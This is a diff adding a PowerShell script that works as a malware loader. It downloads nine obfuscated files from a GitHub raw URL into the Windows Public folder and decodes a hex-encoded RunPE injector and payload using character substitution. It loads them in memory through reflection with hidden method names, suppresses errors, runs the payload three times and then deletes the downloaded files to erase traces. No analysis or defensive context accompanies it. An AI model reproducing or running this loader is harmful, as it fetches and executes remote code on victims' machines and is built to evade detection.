@@ -1,0 +1,58 @@
+#123435353
+
+
+$baseURL = "https://raw.githubusercontent.com/ripio95p-del/suck/main/jamaica/"
+$arquivos = @(
+    "LATIENDA_xx.txt",
+    "LATIENDA_type.txt",
+    "LATIENDA_runpe.txt",
+    "LATIENDA_msg.txt",
+    "LATIENDA_method.txt",
+    "LATIENDA_load.txt",
+    "LATIENDA_invoke.txt",
+    "LATIENDA_Framework.txt",
+    "LATIENDA_Execute.txt"
+)
+foreach ($arquivo in $arquivos) {
+    $urlCompleta = "$baseURL/$arquivo"
+    $destino = "$env:PUBLIC\$arquivo"
+    Invoke-WebRequest -Uri $urlCompleta -OutFile $destino
+}
+Start-Sleep -Seconds 20
+Function ConverterBinarioParaTexto($entrada) {
+    $entrada = $entrada.Trim()
+    $listaBytes = [System.Collections.Generic.List[Byte]]::new()
+    for ($i = 0; $i -lt $entrada.Length; $i += 8) {
+        $listaBytes.Add([Convert]::ToByte($entrada.Substring($i, 8), 2))
+    }
+    return [System.Text.Encoding]::ASCII.GetString($listaBytes.ToArray())
+}
+Function HexParaBytes($entrada) {
+    $entrada = $entrada.Trim()
+    return ($entrada -split '(..)' | Where-Object {$_}) | ForEach-Object { [Convert]::ToByte($_, 16) }
+}
+Function ExecutarPayload {
+    $pastaPublica = "$env:PUBLIC\"
+    $mensagemCodificada = (Get-Content ($pastaPublica + "LATIENDA_msg.txt") -Raw).Trim() -replace "%","0" -replace "!","1" -replace "@","A"
+    $codigoRunPE = (Get-Content ($pastaPublica + "LATIENDA_runpe.txt") -Raw).Trim() -replace "%","0" -replace "!","1" -replace "@","A"
+    try {
+        [byte[]]$mensagemBytes = HexParaBytes $mensagemCodificada
+        [byte[]]$dllBytes = HexParaBytes $codigoRunPE
+        $nomeMetodoLoad   = (Get-Content ($pastaPublica + "LATIENDA_load.txt") -Raw).Trim()
+        $nomeMetodoTipo   = (Get-Content ($pastaPublica + "LATIENDA_type.txt") -Raw).Trim()
+        $parametroClasse  = ConverterBinarioParaTexto (Get-Content ($pastaPublica + "LATIENDA_xx.txt") -Raw)
+        $nomeMetodoExec   = (Get-Content ($pastaPublica + "LATIENDA_method.txt") -Raw).Trim()
+        $parametroMetodo  = ConverterBinarioParaTexto (Get-Content ($pastaPublica + "LATIENDA_Execute.txt") -Raw)
+        $nomeInvoke       = (Get-Content ($pastaPublica + "LATIENDA_invoke.txt") -Raw).Trim()
+        $paramFramework   = ConverterBinarioParaTexto (Get-Content ($pastaPublica + "LATIENDA_Framework.txt") -Raw)
+        [Reflection.Assembly]::$nomeMetodoLoad($dllBytes).$nomeMetodoTipo($parametroClasse).$nomeMetodoExec($parametroMetodo).$nomeInvoke($null, [object[]]@($paramFramework, $null, $mensagemBytes, $true))
+    } catch {}
+}
+for ($i = 1; $i -le 3; $i++) {
+    ExecutarPayload
+    Start-Sleep -Seconds 3
+}
+foreach ($arquivo in $arquivos) {
+    $destino = "$env:PUBLIC\$arquivo"
+    Remove-Item -Path $destino -Force -ErrorAction SilentlyContinue
+}
